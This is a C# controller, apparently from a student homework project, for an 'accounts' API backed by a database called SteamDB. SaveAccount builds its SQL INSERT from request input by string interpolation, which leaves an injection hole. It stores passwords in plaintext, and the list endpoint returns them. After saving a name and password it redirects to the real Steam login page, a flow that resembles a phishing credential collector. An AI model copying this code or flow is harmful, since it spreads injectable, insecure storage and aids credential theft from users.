using System.Data.SqlClient;
using System.Net;
using googleHW.Attributes;
using googleHW.Models;

namespace googleHW.Controllers;

[HttpController("accounts")]
public class Accounts
{
    //Get /accounts/ - spisok accauntov
    //Get /accounts/{id} - account
    //POST /accounts - dobavl9t infu na server cherez body
    
    string connectionString =
        @"Data Source=(localdb)\MSSQLLocalDB;Initial Catalog=SteamDB;Integrated Security=True;";
    
    
    [HttpGET("list")]
    public List<Account> getAccounts()
    {
        
        string sqlExpression = "SELECT * FROM Accounts";
        using (SqlConnection connection = new SqlConnection(connectionString))
        {        
            var result = new List<Account>();
            connection.Open();
            SqlCommand command = new SqlCommand(sqlExpression, connection);
            SqlDataReader reader = command.ExecuteReader();

            if (reader.HasRows) 
            {
                while (reader.Read()) 
                {
                    int id = reader.GetInt32(0);
                    string name = reader.GetString(1);
                    string password = reader.GetString(2);
                    result.Add(new Account(id, name, password));
                }
            }
            reader.Close();
            return result;
        }
    }
    
    [HttpGET($"")]
    public Account? GetAccountById(int id)
    {
        string sqlExpression = $"SELECT * FROM Accounts WHERE id = {id}";
        using (SqlConnection connection = new SqlConnection(connectionString))
        {
            connection.Open();
            SqlCommand command = new SqlCommand(sqlExpression, connection);
            SqlDataReader reader = command.ExecuteReader();
 
            if(reader.HasRows) 
            {
                if (reader.Read()) 
                {
                    int Id = reader.GetInt32(0);
                    string name = reader.GetString(1);
                    string password = reader.GetString(2);
                    var result = new Account(Id, name, password);
                    reader.Close();
                    return result;
                }
            }
            reader.Close();
        }

        return null;
    }


    [HttpPOST("save")]
    public void SaveAccount(HttpListenerContext listener)
    {
        using var sr = new StreamReader(listener.Request.InputStream, listener.Request.ContentEncoding);
        var bodyParam = sr.ReadToEnd();
        var Params = bodyParam.Split("&");
        var name = Params[0].Split("=")[1];
        var password = Params[1].Split("=")[1];
        
        string sqlExpression = $"INSERT INTO Accounts (Name, Password) VALUES (\'{name}\', \'{password}\')";

        using (SqlConnection connection = new SqlConnection(connectionString))
        {
            connection.Open();
            SqlCommand command = new SqlCommand(sqlExpression, connection);
            command.ExecuteNonQuery();

        }
        listener.Response.Redirect(@"https://steamcommunity.com/login/home/");
    }
    
    
    
}